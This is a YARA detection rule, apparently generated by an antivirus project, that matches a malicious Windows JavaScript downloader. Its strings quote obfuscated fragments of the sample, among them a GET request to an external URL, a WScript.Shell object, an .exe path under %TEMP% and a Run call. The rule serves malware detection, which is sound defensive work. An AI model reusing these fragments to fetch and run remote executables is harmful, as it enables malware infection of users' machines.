rule sig_20160401_87c83185341925654e7af9645e6b8bc8 {
  meta:
    description = "datamaliciousorder - file 20160401_87c83185341925654e7af9645e6b8bc8.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "e73e593564fa0e5395ed1ca9540cfda4f23389d235b87b5f94862188595844b8"

  strings:
    $s1  = "PwfEki[CqzIy](\"G\" + \"ET\", \"http://geetanjalifincorp.com/pqw9aso\", false);" fullword ascii
    $s2  = "var ZsIwd = function OqbZt() {return WScript[MuhTnl](\"WScript\"+\".Shell\");}(), ShKuu = 11;" fullword ascii
    $s3  = "function McSqe(QmPqh, WmBw){IbtYe = IbtYe * 1; return QmPqh - WmBw;};" fullword ascii
    $s4  = "if (PwfEki[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function DvlCiw(){return KxzQk + \"\";};" fullword ascii
    $s6  = "function JxoXp() {return ZsIwd[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"hVmEjLSuMn4nlvOS.ex\" + \"e\";};" fullword ascii
    $s7  = "function PefPm() {return ((XbCor == true) && (XbCor == MmQh)) ? 1 : IbtYe;};" fullword ascii
    $s8  = "var YaMze = false;" fullword ascii
    $s9  = "XbCor = true; " fullword ascii
    $s10 = "var MmQh = false;" fullword ascii
    $s11 = "return McSqe(GxDp, LaYqm);" fullword ascii
    $s12 = "function PfrSv(){return MuhTnl;};" fullword ascii
    $s13 = "MmQh = true; " fullword ascii
    $s14 = "var DzTtu = new this[\"Date\"]();" fullword ascii
    $s15 = "}while (YtNxz);" fullword ascii
    $s16 = "function YfJb()" fullword ascii
    $s17 = "function ExlNh(){return 23;};" fullword ascii
    $s18 = "function FyHgj(ZwAq) {var YffRfk = (1, 2, 3, 4, 5, ZwAq); return YffRfk;};" fullword ascii
    $s19 = "var XbCor = false;" fullword ascii
    $s20 = "function VbSg(FrMx){ZsIwd[\"R\"+\"un\"](FrMx, IbtYe, IbtYe);};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}